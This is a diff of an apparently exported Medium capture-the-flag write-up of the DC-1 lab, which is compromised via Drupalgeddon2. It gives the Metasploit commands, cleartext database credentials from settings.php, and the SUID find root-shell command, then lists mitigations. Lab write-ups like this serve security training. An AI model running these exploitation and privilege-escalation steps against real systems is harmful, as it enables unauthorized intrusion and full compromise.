@@ -1,35 +1,35 @@
-# 🛡️ Unearthing the Truth in DC-1 \| From Drupalgeddon to Root 🛡️
+# DC-1
 
 From unpatched CMS flaws to SUID privilege escalation, we sweep the house to find every hidden flag. 100% completion rooted in precision…
 
----
+***
 
-### 🛡️ Unearthing the Truth in DC-1 \| From Drupalgeddon to Root 🛡️
+### 🛡️ Unearthing the Truth in DC-1 | From Drupalgeddon to Root 🛡️
 
-#### From unpatched CMS flaws to SUID privilege escalation, we sweep the house to find every hidden flag. 100% completion rooted in precision and faith. 🎯🙏
+#### From unpatched CMS flaws to SUID privilege escalation, we sweep the house to find every hidden flag. 100% completion rooted in precision and faith. 🎯🙏
 
 ![](https://cdn-images-1.medium.com/max/800/1*L9G78VPBO7C73svC6VDpRA.png)
 
-**Target**: *DC-1 (192.168.239.193)*\[PG OffSec\] **OS:** *Linux (Debian 7)* **Difficulty:** Easy **Attack Vectors:** *Drupalgeddon2 (RCE) -\> Database Credential Reuse -\> SUID Privilege Escalation.*
+**Target**: _DC-1 (192.168.239.193)_\[PG OffSec] **OS:** _Linux (Debian 7)_ **Difficulty:** Easy **Attack Vectors:** _Drupalgeddon2 (RCE) -> Database Credential Reuse -> SUID Privilege Escalation._
 
 ### Executive Summary
 
-**Assessment Date:** *January 22, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h\Nicholas Mullenski*
+**Assessment Date:** _January 22, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h\Nicholas Mullenski_
 
 #### Overview
 
 An assessment of the “DC-1” server revealed a critical vulnerability in the Content Management System that led to a full system compromise. The server, running an outdated version of Drupal 7, was susceptible to the “Drupalgeddon2” exploit. This allowed for unauthenticated remote code execution, which was further leveraged through insecure configuration files and misconfigured system binaries to achieve total administrative control (Root).\
 **Key Findings:**
 
-- <span id="6326">**Unauthenticated Remote Code Execution:** The Drupal 7 installation was vulnerable to CVE-2018–7600 (Drupalgeddon2). This allowed an unauthenticated attacker to execute arbitrary PHP code via the Form API, resulting in an initial low-privileged shell (www-data).</span>
-- <span id="c9bc">**Cleartext Credentials:** Post-exploitation enumeration of the web root revealed the sites/default/settings.php file containing cleartext database credentials (dbuser / R0ck3t). These credentials permitted access to the backend database to manually reset the administrative password.</span>
-- <span id="983b">**Privilege Escalation:** The /usr/bin/find binary was configured with the SUID bit enabled. This misconfiguration allowed an authenticated user to execute system commands as Root using the -exec flag, leading to full system compromise.</span>
+* **Unauthenticated Remote Code Execution:** The Drupal 7 installation was vulnerable to CVE-2018–7600 (Drupalgeddon2). This allowed an unauthenticated attacker to execute arbitrary PHP code via the Form API, resulting in an initial low-privileged shell (www-data).
+* **Cleartext Credentials:** Post-exploitation enumeration of the web root revealed the sites/default/settings.php file containing cleartext database credentials (dbuser / R0ck3t). These credentials permitted access to the backend database to manually reset the administrative password.
+* **Privilege Escalation:** The /usr/bin/find binary was configured with the SUID bit enabled. This misconfiguration allowed an authenticated user to execute system commands as Root using the -exec flag, leading to full system compromise.
 
 #### Strategic Recommendation
 
 Immediate patching of the Drupal CMS to the latest secure version is required to mitigate Remote Code Execution risks. Additionally, the SUID bit must be removed from the find binary to prevent privilege escalation, and sensitive configuration files should be restricted to read-only access for the root user.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Enumeration & Reconnaissance
 
@@ -85,9 +85,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 #### Key Findings:
 
-- <span id="14bb">**Port 22 (SSH):** OpenSSH 6.0p1 (Debian). Generally secure unless weak credentials are found.</span>
-- <span id="c4e7">**Port 80 (HTTP)**: Apache 2.2.22 running Drupal 7. This is the primary point of interest.</span>
-- <span id="880c">**Port 111 (RPC):** rpcbind. Useful for identifying further network services, but usually secondary to web vulnerabilities.</span>
+* **Port 22 (SSH):** OpenSSH 6.0p1 (Debian). Generally secure unless weak credentials are found.
+* **Port 80 (HTTP)**: Apache 2.2.22 running Drupal 7. This is the primary point of interest.
+* **Port 111 (RPC):** rpcbind. Useful for identifying further network services, but usually secondary to web vulnerabilities.
 
 #### **1.2 Web Application Analysis**
 
@@ -95,14 +95,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![](https://cdn-images-1.medium.com/max/800/1*7RT6HQzf-_C8_nWBl2SB3g.png)
 
-- <span id="f916">**Generator:** Drupal 7</span>
-- <span id="fe87">**Robots.txt:** Revealed standard Drupal directories (e.g., /includes/, /modules/, /admin/), confirming the CMS structure is intact and likely default.</span>
+* **Generator:** Drupal 7
+* **Robots.txt:** Revealed standard Drupal directories (e.g., /includes/, /modules/, /admin/), confirming the CMS structure is intact and likely default.
 
 ![](https://cdn-images-1.medium.com/max/800/1*JVvQbdk5yk8CtqJiYWqa9Q.png)
 
 **1.2.2 Vulnerability Identification:** Drupalgeddon
 
-- <span id="8a3e">Drupal 7 is famously vulnerable to Drupalgeddon2 (CVE-2018–7600), an unauthenticated remote code execution (RCE) vulnerability that occurs due to insufficient input validation on Form API (render arrays).</span>
+* Drupal 7 is famously vulnerable to Drupalgeddon2 (CVE-2018–7600), an unauthenticated remote code execution (RCE) vulnerability that occurs due to insufficient input validation on Form API (render arrays).
 
 ### 2.0 Exploitation
 
@@ -112,19 +112,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 **2.1.2 Exploitation via Metasploit**
 
-- <span id="b03f">Since this is a common lab machine, we will use the Metasploit Framework for a stable, interactive shell.</span>
+* Since this is a common lab machine, we will use the Metasploit Framework for a stable, interactive shell.
 
 Commands:
 
-- <span id="36a4">`mfsconsole`</span>
-- <span id="58d3">`use exploit/unix/webapp/drupal_drupalgeddon2`</span>
-- <span id="a22d">`set RHOSTS 192.168.239.193`</span>
-- <span id="bd65">`set LHOST tun0`</span>
-- <span id="d6e2">`exploit`</span>
+* `mfsconsole`
+* `use exploit/unix/webapp/drupal_drupalgeddon2`
+* `set RHOSTS 192.168.239.193`
+* `set LHOST tun0`
+* `exploit`
 
 ### 3.0 Internal Enumeration
 
-#### 3.2 Finding the Flags
+#### 3.2 Finding the Flags
 
 **3.2.1 Flag 1: Web Root:** Located in the web root, this file provided the hint: “Every good CMS needs a config file — and so do you.”
 
@@ -134,13 +134,13 @@ Commands:
 
 **3.2.2 Flag 2: Drupal Configuration**
 
-- <span id="4dbb">Following the hint, the Drupal settings file was found at ./sites/default/settings.php. It contained Flag 2 and database credentials:</span>
+* Following the hint, the Drupal settings file was found at ./sites/default/settings.php. It contained Flag 2 and database credentials:
 
 ![](https://cdn-images-1.medium.com/max/800/1*_1LOKjMBNsy12DZLCkbalw.png)
 
 **3.2.3 Flag 3: Administrative Dashboard**
 
-- <span id="2a5b">After using the Drupal password-hash script to reset the admin password, Flag 3 was found by navigating to the Content section of the web dashboard.</span>
+* After using the Drupal password-hash script to reset the admin password, Flag 3 was found by navigating to the Content section of the web dashboard.
 
 Hint: “Special PERMS will help FIND the passwd — but you’ll need to -exec that command to work out how to get what’s in the shadow.”
 
@@ -148,31 +148,31 @@ Hint: “Special PERMS will help FIND the passwd — but you’ll need to -e
 
 ### 4.0 Privilege Escalation
 
-#### 4.1 Exploiting SUID Binaries
+#### 4.1 Exploiting SUID Binaries
 
 **4.1.1 Following** the hint in Flag 3, a search for SUID binaries was conducted.
 
-- <span id="58f5">Command: `find / -perm -u=s -type f 2>/dev/null`</span>
+* Command: `find / -perm -u=s -type f 2>/dev/null`
 
 ![](https://cdn-images-1.medium.com/max/800/1*0iVsaY3y0QHQBhpV4MJCUQ.png)
 
 **Discovery:** The /usr/bin/find binary was identified as having the SUID bit set.
 
-#### 4.2 Gaining Root Access
+#### 4.2 Gaining Root Access
 
 **4.2.1 Using the SUID** find binary, a root shell was spawned by executing /bin/sh.
 
-**Command:** `find . -exec /bin/sh \; -quit`
+**Command:** `find . -exec /bin/sh \; -quit`
 
 **Verification:** `whoami` returned `root`.
 
 ![](https://cdn-images-1.medium.com/max/800/1*75VYmeIZawDe3iR9_qm_8Q.png)
 
-#### 4.3 Local & Root Flags
+#### 4.3 Local & Root Flags
 
 **4.3.1 User Proof (local.txt)**
 
-- <span id="400d">The user-level hash was located directly at the root of the home directory rather than within a specific user’s folder.</span>
+* The user-level hash was located directly at the root of the home directory rather than within a specific user’s folder.
 
 **Exact Path:** `/home/local.txt`
 
@@ -180,7 +180,7 @@ Hint: “Special PERMS will help FIND the passwd — but you’ll need to -e
 
 **4.2 Root Proof (proof.txt)**
 
-- <span id="4072">The root-level hash was retrieved from the administrative home directory.</span>
+* The root-level hash was retrieved from the administrative home directory.
 
 Exact Path: `/root/proof.txt`
 
@@ -188,9 +188,9 @@ Exact Path: `/root/proof.txt`
 
 ### 5.0 Lessons Learned & Mitigation
 
-- <span id="3997">**Vulnerable Service:** An outdated Drupal 7 installation allowed for unauthenticated Remote Code Execution (RCE).</span>
-- <span id="384a">**Weak Permissions:** The find binary was configured with the SUID bit, allowing a low-privileged user to execute commands as root.</span>
-- <span id="e159">**Remediation:** Admins must patch Drupal to the latest security version and audit SUID permissions using find / -perm -u=s to ensure the principle of least privilege is maintained.</span>
+* **Vulnerable Service:** An outdated Drupal 7 installation allowed for unauthenticated Remote Code Execution (RCE).
+* **Weak Permissions:** The find binary was configured with the SUID bit, allowing a low-privileged user to execute commands as root.
+* **Remediation:** Admins must patch Drupal to the latest security version and audit SUID permissions using find / -perm -u=s to ensure the principle of least privilege is maintained.
 
 ### The Scriptural Connection
 
@@ -202,8 +202,8 @@ As we finish this lab and document the final path, we reflect on the importance 
 
 **The Connection:** In a lab, “guessing” isn’t enough; you need the exact “knowledge” of where the flag is to complete the mission. In our R00t3dbyFa17h walk, we seek that same level of precision and “spiritual wisdom” so we aren’t led astray by assumptions. You swept the house, found the exact path, and now the truth of the system’s compromise is fully understood.
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [February 28, 2026](https://medium.com/p/8cb0f626ebee).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [February 28, 2026](https://medium.com/p/8cb0f626ebee).
 
-<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-unearthing-the-truth-in-dc-1-from-drupalgeddon-to-root-%EF%B8%8F-8cb0f626ebee" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-unearthing-the-truth-in-dc-1-from-drupalgeddon-to-root-%EF%B8%8F-8cb0f626ebee)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
